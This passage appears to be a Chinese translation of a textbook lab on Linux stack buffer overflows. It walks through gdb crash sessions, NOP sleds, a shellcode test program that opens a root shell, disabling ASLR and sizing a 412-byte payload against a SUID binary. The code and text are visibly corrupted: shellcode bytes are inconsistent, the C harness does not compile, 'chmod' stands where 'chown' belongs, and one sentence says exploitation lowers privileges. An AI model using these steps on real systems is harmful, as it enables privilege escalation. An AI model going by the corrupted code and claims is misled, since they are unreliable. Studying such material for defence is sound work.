
0x4141414d, at `meet.c`:10

10    `greeting(argv[1], argv[2])`; // call function, pass type &name

`(gdb) info regb eip`

`ebp`        `0x41414141`        `0x41414141`

`eip`        `0x565556202`        `0x565556202<main+19>`

`(gdb) run `python -c 'print("A*412")'```....

`Program received SIGSEGV, Segmentation fault.`

`0x41414141 in ?? ()`

`(gdb) info regb eip`

`ebp`        `0x41414141`        `0x41414141`

`eip`        `0x41414141`        `0x41414141`

`(gdb) q`

`A debugging session is active.`

`Inferior 1 [process 8757] will be killed.`

`Quit away? (y or n)`

```
```

如你所见，当 `gdb` 中发生段错误时，`EIP` 的当前值会被显示出来。

重要的是，这些数字（400–412）并不像“从低位开始缓慢增加，直到刚好溢出保存的 `EIP` 而别无其他”的概念那么重要。这是由于溢出后紧接着是 `printf` 调用。有时你会有更大的回旋地，不需要过度担心这一点。例如，如果在脆弱的 `strcpy` 命令之后没有任何其他指令，那么在这种情况下，溢出超过 412 字节也不会产生问题。

![](img/0add480ffb73b6bc89b65d99f7d6b37a_370_0.png)

**注意** 记住，我们在这里使用的只是一段非常简单的缺陷代码；在现实生活中，你会遇到许多此类问题。再次强调，你想要的是概念，而不是溢出特定漏洞代码所需的数字。

## 缓冲区溢出的后果

当你处理缓冲区溢出时，基本上会发生三件事。第一种是拒绝服务。正如你之前看到的，在处理进程内存时，很容易导致段错误。然而，在这种情况下的，这对于软件开发人员来说可能可能是最好的结果，因为程序崩溃会引起注意。

缓冲区溢出发生时可能发生的第二种情况是 `EIP` 可以被控制在用户权限级别执行恶意代码。当漏洞程序运行在用户权限级别时就会发生这种情况。

缓冲区溢出发生时可能发生的第三种情况是 `EIP` 可以被控制在系统级或 `root` 级别执行恶意代码。某些 Linux 功能应该受到保护并留给 `root` 用户使用。例如，赋予用户 `root` 权限来更改密码通常是一个坏主意。因此，开发了设置用户 ID（SUID）和设置组 ID（SGID）的概念，用以临时提升某些文件，使其在所有者和/或组的权限级别下执行。例如，`passwd` 命令可以归 `root` 所有，当非特权用户执行它时，该进程将以 `root` 身份运行。这里的问题在于，当 SUID/SGID 程序存在漏洞时，成功的利用将降低文件所有者或组的权限（最坏的情况下是 `root`）。要使一个程序成为 SUID 程序，你需要执行以下命令：

```
chmod u+s <filename> or chmod 4755 <filename>
```

程序将以文件所有者的权限运行。为了看到其全部后果，我们将 SUID 设置应用到我们的程序上。稍后当我们利用这个程序时，我们将获得 `root` 权限。

```
$ sudo chmod root:root meet
$ sudo chmod u+s meet
$ ls -1 meet
-rwsr-xr-x 1 root 16736 Jul 1 01:41 meet
```

上一行的第一个字段表示文件权限。文件的第一个位置用于指示链接、目录或文件（`l`、`d` 或 `-`）。接下来的三个位置代表文件所有者的权限，顺序为：读、写、执行。当设置 SUID 位时，`x` 被替换为 `s`，这意味着执行该文件时将以所有者的权限运行（在这种情况下为 `root`）。

## 缓冲区溢出利用

缓冲区溢出的主要目标之一是控制 `EIP` 以获取任意代码执行来实现提权。在本节中，我们将介绍一些常见的漏洞以及如何利用它们。

### 实验 10-2：利用的组件

在缓冲区溢出情况下构建有效的利用，你需要创建一个比程序预期更大的缓冲区，包含以下组件：NOP 滑块、`shellcode` 和返回地址。

### NOP 滑

在汇编代码中，NOP（无操作）仅仅意味着什么都不做并移动到下一条指令。黑客学会了使用填充 NOP。当将其放在利用的开头时，这种填充被称为 *NOP sled*。如果 `EIP` 指向滑块，处理器将滑向下一个。在 x86 系统上，`0x90` 代表 NOP。实际上有很多，但 `0x90` 是最常用的。任何不干扰利用结果的操作序列都被视为 NOP。

`shellcode` 是用于提供 shell 的机器代码术语。从那时起该术语演变为用于执行更多操作，例如提权或在远程系统上执行命令。重要的是意识到 `shellcode` 实际上是用于 x86 架构的二进制操作码，在这种情况下，通常以十六进制形式表示。你可以在网上找到大量的 `shellcode`，准备用于所有平台。我们将如下使用 Aleph 著名的 `shellcode`：

```c
#include <stdio.h>
#include <sys/mman.h>
```

```c
char shellcode[] = "\x31\x00\x31\xdb\xb0\x17\xcd\x88\xeb\xf1\x5e\x89\x76\x08\x31\x00\x46\x07\x89\x46\xc0\x0b\xb9\x83\xf3\x64\x08\xd8\x56\x0c\xcd\x31\xdb\x89\xd8\x40\xc0\x80\xe8\xff() { // shellcode 位于 .data 段，
    // 我们将使用 mprotect 使其可执行。
    mprotect(
        (void *)((int)shellcode & -4095),
        4096,
        PRO_READ | PRO_WRITE | PRO_EXEC
    );
    // 将 shellcode 的地址转换为函数指针，
    // 允许我们调用它并执行代码。
    int (*ret)() = (int(*())shellcode;
    return ret();
}
```

编译并运行测试 `shellcode.c` 程序：

```
$ gcc -m32 -o shellcode shellcode.c
$ sudo chmod root:root shellcode && sudo chmod u+s shellcode
./shellcode
# id
uid=0(root) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo)...
```

成功了——我们得到了 `root` shell。

## 实验 10-3：从命令行利用栈溢出

记得在实验 10-1 中，覆盖 `meet.c` 上 `EIP` 需要的大小是 412。因此，我们将使用 Python 来编写利用。

首先，通过执行以下命令禁用该实验的 ASLR：

```
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

现在，让 `printf` 和 `wc` 计算我们 `shellcode` 的大小：

```
$ printf "\x31\xc0\x31\xdb\x00\x17\x80\x1f\x5e\x76\x89\x31\x88\x46\x07\x89\x46\xc0\x0b\xb9\x83\xf3\x64\x08\xd8\x56\x0c\xcd\x31\xdb\x89\xd8\x40\xc0\x80\xe8\xdc\xff\xff\/bin/sh" | wc -c 53
```

接下来，我们将使用 `gdb` 找到 `EIP` 指向哪里以便用 412 字节覆盖 `EIP`，因此我们的第一步是从 `gdb` 加载并使二进制文件崩溃。为了这一点，我们将执行以下命令：

```
$ gdb -q --args ./meet 'python -c 'print("A"*412)''
Reading symbols from ./meet...
Starting program: /home/kame/GHv6/gdb10/meet 'python -c 'print("A"*412)''
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
..."
```
